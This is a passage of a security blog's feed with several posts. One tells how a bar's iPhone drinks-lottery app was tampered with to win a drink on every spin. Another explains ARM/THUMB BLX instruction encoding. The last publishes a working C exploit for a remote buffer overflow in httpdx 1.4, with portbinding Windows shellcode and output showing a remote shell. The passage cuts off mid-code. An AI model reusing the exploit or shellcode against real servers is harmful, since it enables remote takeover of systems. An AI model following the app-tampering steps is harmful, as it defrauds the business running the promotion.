+2013-11-03 23:37:40 URL:http://www.exhost.se/harrys_1_1_beta/img/5.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;60030/60030&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/5.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:44 URL:http://www.exhost.se/harrys_1_1_beta/img/6.jpg &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;124823/124823&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/6.jpg&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:46 URL:http://www.exhost.se/harrys_1_1_beta/img/6.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;50119/50119&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/6.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:47 URL:http://www.exhost.se/harrys_1_1_beta/img/7.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;45129/45129&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/7.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:49 URL:http://www.exhost.se/harrys_1_1_beta/img/8.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;50769/50769&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/8.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:50 URL:http://www.exhost.se/harrys_1_1_beta/img/9.png &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;40394/40394&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/img/9.png&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+2013-11-03 23:37:52 URL:http://www.exhost.se/harrys_1_1_beta/js/jquery.min.js &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;85925/85925&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; -&amp;gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;www.exhost.se/harrys_1_1_beta/js/jquery.min.js&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
+FINISHED --2013-11-03 23:37:52--
+Total wall clock &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 54s
+Downloaded: &lt;span class=&quot;m&quot;&gt;25&lt;/span&gt; files, 950K in 34s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;28.1 KB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;iPhone:~ root# strings -o /var/mobile/Applications/0B57A351-CE6D-4B05-A5D0-8B12BB150791/Harrys.app/Harrys &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; grep &lt;span class=&quot;s2&quot;&gt;&amp;quot;http://www.exhost.se&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;m&quot;&gt;839501&lt;/span&gt; http://www.exhost.se/harrys_1_1_beta/
+&lt;span class=&quot;m&quot;&gt;842849&lt;/span&gt; http://www.exhost.se/harrys_1_1_beta/venues.xml
+&lt;span class=&quot;m&quot;&gt;843075&lt;/span&gt; http://www.exhost.se/harrys_1_1_beta/fetchdata.php&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Once we have the crawled files, we can edit the &lt;code&gt;venues.xml&lt;/code&gt; file to change the probabilities. We can even change the drinks! ;-) Also, the file &lt;code&gt;fetchdata.php&lt;/code&gt; should contain &lt;code&gt;true&lt;/code&gt; for us to spin any number of times. Now these files can be hosted on a different server and these URLs can be changed in the app mach-o binary. Changing only the above two URLs is sufficient to make it work without any restrictions. The strings utility comes handy when trying to find out the location of these strings in the binary. These strings can now be edited using a hex editor. &lt;/p&gt;
+
+&lt;figure align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/images/strings.png&quot; /&gt;
+    &lt;figcaption&gt;Strings as seen in the disassembler after modification&lt;/figcaption&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;Once edited, we can run the app any number of times while signed in the same bar, and win a drink on every spin!&lt;/p&gt;
+
+&lt;p&gt;Cheers!&lt;/p&gt;
+
+
+    &lt;p&gt;&lt;a href=&quot;/posts/dirty-harry-hacking-for-free-drinks-in-singapore.html&quot;&gt;Dirty Harry: Hacking for free drinks in Singapore&lt;/a&gt; was originally published by Pankaj Kohli at &lt;a href=&quot;&quot;&gt;Pankaj Kohli&lt;/a&gt; on November 04, 2013.&lt;/p&gt;
+  </content>
+</entry>
+
+
+  
+
+<entry>
+  <title type="html"><![CDATA[Assembling from scratch: Encoding BLX instruction in ARM / THUMB]]></title>
+  <link rel="alternate" type="text/html" href="/posts/assembling-from-scratch-encoding-blx-instruction-in-arm-thumb.html" />
+  <id>/posts/assembling-from-scratch-encoding-blx-instruction-in-arm-thumb</id>
+  <published>2013-10-19T13:23:25+08:00</published>
+  <updated>2013-10-19T13:23:25+08:00</updated>
+  <author>
+    <name>Pankaj Kohli</name>
+    <uri></uri>
+    
+  </author>
+  <content type="html">
+    &lt;p&gt;If you have been working on x86 disassembly and moving on to ARM disassembly, one of the subtle differences you may notice is the lack of byte aligned opcodes in ARM (or THUMB) instruction set. Being based on RISC, ARM architecture provides fewer instructions as compared to x86. The need to implement an instruction set having functionally similar instructions as their x86 counterparts, only using fewer (and perhaps smaller) instructions gave rise to the instructions where opcodes are not dictated by bytes but by bits.&lt;/p&gt;
+
+&lt;figure align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/images/blx.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;One of such intriguing instructions in ARM is BLX. BLX instruction performs a PC relative unconditional branch, and optionally changes mode to ARM or THUMB depending on the target address. It encodes to a 32-bit word under THUMB mode 2. It’s encoding varies depending upon the relative offset between the instruction and the target address. For e.g. the instruction at 0x2EA6 in the disassembly above encodes to &lt;code&gt;D8 F0 08 E8&lt;/code&gt; while another BLX instruction at 0x30C4 encodes to &lt;code&gt;8E F3 C4 E9&lt;/code&gt;. The encoded instruction itself is divided into two 16-bit halves, each of which is shown in little-endian. The actual encodings are therefore F0 D8 E8 08 and F3 8E E9 C4. The encoding is explained in the THUMB instruction set (available &lt;a href=&quot;https://ece.uwaterloo.ca/~ece222/ARM/ARM7-TDMI-manual-pt3.pdf&quot;&gt;here&lt;/a&gt;).&lt;/p&gt;
+
+&lt;figure align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/images/blxasm1.png&quot; /&gt;
+    &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;
+    &lt;img src=&quot;/images/blxasm2.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;h2 id=&quot;calculating-the-offset&quot;&gt;Calculating the offset&lt;/h2&gt;
+
+&lt;p&gt;The instruction at 0x2EA6 branches to &lt;code&gt;_obj_msgSend&lt;/code&gt;, which is at 0xDAEB8. The offset for encoding is calculated from the current value of PC which is 4 bytes ahead due to pipeline, i.e. 0x2EAA. When the target of branch is 32-bit ARM code, the value used is align(PC, 4), which is PC rounded down to align it to 4 bytes, i.e. PC &amp;amp; 0xFFFFFFFC (0x2EA8 in this case). The offset is therefore, 0xDAEB8 - 0x2EA8 = 0xD8010.&lt;br /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;encoding-the-instruction&quot;&gt;Encoding the instruction&lt;/h2&gt;
+
+&lt;p&gt;The offset is then used to encode the instruction as follows:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;Offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0xD8010
+ 
+      &lt;span class=&quot;m&quot;&gt;00&lt;/span&gt;            0D            &lt;span class=&quot;m&quot;&gt;80&lt;/span&gt;            10
+ 
+Bits 31-24         23-16         15-8           7-0
+   &lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1101&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;0001&lt;/span&gt; 0000
+ 
+Bits 31-25      &lt;span class=&quot;m&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;22&lt;/span&gt;       21-12          11-2         10
+     &lt;span class=&quot;m&quot;&gt;0000000&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;0011011000&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;0000000100&lt;/span&gt;     00
+                 S I1  I2         H              L
+ 
+&lt;span class=&quot;nv&quot;&gt;J1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ~I1 ^ &lt;span class=&quot;nv&quot;&gt;S&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
+&lt;span class=&quot;nv&quot;&gt;J2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ~I2 ^ &lt;span class=&quot;nv&quot;&gt;S&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
+ 
+Encoded instruction:
+ 
+Bits 32-28    &lt;span class=&quot;m&quot;&gt;27&lt;/span&gt;       26-17      16-15 &lt;span class=&quot;m&quot;&gt;14&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;12&lt;/span&gt;     11-1          0
+               S          H             J1    J2        L
+     &lt;span class=&quot;m&quot;&gt;11110&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;0011011000&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;11&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;0000000100&lt;/span&gt;     0
+ 
+      &lt;span class=&quot;m&quot;&gt;1111&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;1101&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1000&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;1110&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1000&lt;/span&gt;     &lt;span class=&quot;m&quot;&gt;0000&lt;/span&gt; 1000
+ 
+         F0            D8             E8           08&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;which explains the encoding seen in the disassembler &lt;code&gt;(D8 F0 08 E8)&lt;/code&gt;. :-)&lt;/p&gt;
+
+
+    &lt;p&gt;&lt;a href=&quot;/posts/assembling-from-scratch-encoding-blx-instruction-in-arm-thumb.html&quot;&gt;Assembling from scratch: Encoding BLX instruction in ARM / THUMB&lt;/a&gt; was originally published by Pankaj Kohli at &lt;a href=&quot;&quot;&gt;Pankaj Kohli&lt;/a&gt; on October 19, 2013.&lt;/p&gt;
+  </content>
+</entry>
+
+
+  
+
+<entry>
+  <title type="html"><![CDATA[Exploiting File Uploads for Fun and Profit]]></title>
+  <link rel="alternate" type="text/html" href="/posts/exploiting-file-uploads-for-fun-and-profit.html" />
+  <id>/posts/exploiting-file-uploads-for-fun-and-profit</id>
+  <published>2013-06-29T16:57:50+08:00</published>
+  <updated>2013-06-29T16:57:50+08:00</updated>
+  <author>
+    <name>Pankaj Kohli</name>
+    <uri></uri>
+    
+  </author>
+  <content type="html">
+    &lt;p&gt;So I have been working on web application security for past some time. I also happened to write an article titled “Exploiting File Uploads for Fun and Profit” for &lt;a href=&quot;http://hakin9.org/learn-how-to-perform-advanced-web-attacks-and-exploitation-with-more-than-70-pages-of-hakin9-tutorials/&quot;&gt;Hakin9&lt;/a&gt; magazine , which has been published recently. The article explains the various restrictions that are often imposed by web applications on the file being uploaded and how to get around these restrictions. Credit for the techniques described in the article goes to their respective authors.&lt;/p&gt;
+
+&lt;figure align=&quot;center&quot;&gt;
+    &lt;img src=&quot;/images/ExploitingFileUploadsForFunAndProfit-1024x548.png&quot; /&gt;
+&lt;/figure&gt;
+
+&lt;p&gt;You can download the complete article &lt;a href=&quot;/assets/files/ExploitingFileUploadsForFunAndProfit.pdf&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+
+    &lt;p&gt;&lt;a href=&quot;/posts/exploiting-file-uploads-for-fun-and-profit.html&quot;&gt;Exploiting File Uploads for Fun and Profit&lt;/a&gt; was originally published by Pankaj Kohli at &lt;a href=&quot;&quot;&gt;Pankaj Kohli&lt;/a&gt; on June 29, 2013.&lt;/p&gt;
+  </content>
+</entry>
+
+
+  
+
+<entry>
+  <title type="html"><![CDATA[httpdx 1.4 GET Request Remote Buffer Overflow Exploit (0day)]]></title>
+  <link rel="alternate" type="text/html" href="/posts/httpdx-1-4-get-request-remote-buffer-overflow-exploit-0day.html" />
+  <id>/posts/httpdx-1-4-get-request-remote-buffer-overflow-exploit-0day</id>
+  <published>2009-09-04T08:38:36+08:00</published>
+  <updated>2009-09-04T08:38:36+08:00</updated>
+  <author>
+    <name>Pankaj Kohli</name>
+    <uri></uri>
+    
+  </author>
+  <content type="html">
+    &lt;p&gt;httpdx is vulnerable to a stack-based buffer overflow, caused by improper bounds checking by the &lt;code&gt;h_handlepeer()&lt;/code&gt; function. By sending an overly long HTTP GET request, a remote attacker could overflow a buffer and execute arbitrary code on the system or cause the application to crash.&lt;/p&gt;
+
+&lt;p&gt;This exploit is also available as a metasploit module &lt;a href=&quot;http://www.metasploit.com/modules/exploit/windows/http/httpdx_handlepeer&quot;&gt;here&lt;/a&gt;. Thanks to Trancer for porting it to Metasploit.&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cm&quot;&gt;/*&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * httpdx 1.4 GET Request Remote Buffer Overflow Exploit (0day)&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; *&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * Tested with httpdx 1.4 on Windows XP SP3&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; *&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * Written and discovered by Pankaj Kohli&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * http://www.codepwn.com&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; *&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * Greetz: str0ke&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; *&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * httpdx web server 1.4 is vulnerable to a remote buffer overflow using long GET requests&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * such as http://www.example.com/aaa=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * The vulnerability lies in httpdx_src/http.cpp in h_handlepeer() : strcpy(index,client-&amp;gt;filereq);&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; *&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * pankaj@zion:~$ ./httpdxb0f 192.168.2.1 80&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; *&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * ---------------------------------------------------------------------&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * [*] httpdx 1.4 GET Request Remote Buffer Overflow Exploit (0day)&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * [*] Written and discovered by Pankaj Kohli &amp;lt;http://www.codepwn.com&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * [*] Tested with httpdx 1.4 on Windows XP SP3&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; *&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * [+] Creating payload&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * [+] Connecting to 192.168.2.1 on port 80&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * [+] Sending payload&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; *&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * [+] Dropping to shell&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; *&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * Microsoft Windows XP [Version 5.1.2600]&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * (C) Copyright 1985-2001 Microsoft Corp.&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; *&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; * C:\Documents and Settings\pankaj\Desktop\httpdx1.4\root_example&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; *&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;*/&lt;/span&gt;
+
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;error.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/types.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/socket.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;netinet/in.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;arpa/inet.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;netdb.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;fcntl.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/* 128 byte portbinding shellcode (for WinXP SP3) port 58821&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt; Derived from shellcode written by silicon */&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bindcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x89\xE5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x83\xC4\xEC\x33\xC0\x50\x50\x50\x6A\x06&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6A\x01\x6A\x02\xB8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6A\x8B\xAB\x71&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// WSASocketA()&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xFF\xD0\x8B\xD8\x33\xC0\x89\x45\xF4\xB0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x02\x66\x89\x45\xF0\x66\xC7\x45\xF2\xE5&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xC5\x6A\x10\x8D\x55\xF0\x52\x53\xB8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x80\x44\xAB\x71&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// bind()&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xFF\xD0\x6A\x01\x53\xB8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xD3\x8C\xAB\x71&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// listen()&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xFF\xD0\x33\xC0\x50\x50\x53\xB8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x40\x10\xAC\x71&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// accept()&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xFF\xD0\x8B\xD8\xBA&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x63\xD3\x81\x7C&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// SetStdHandle()&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x53\x6A\xF6\xFF\xD2\x53\x6A\xF5\xFF\xD2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x53\x6A\xF4\xFF\xD2\xC7\x45\xFB\x41\x63&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6D\x64\x8D\x45\xFC\x50\xB8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xC7\x93\xC2\x77&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// system()&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xFF\xD0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xC0\x50\xB8&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xFA\xCA\x81\x7C&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ExitProcess()&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xFF\xD0&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/* ripped from TESO code */&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;fd_set&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rfds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;FD_SET&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rfds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;FD_SET&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rfds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
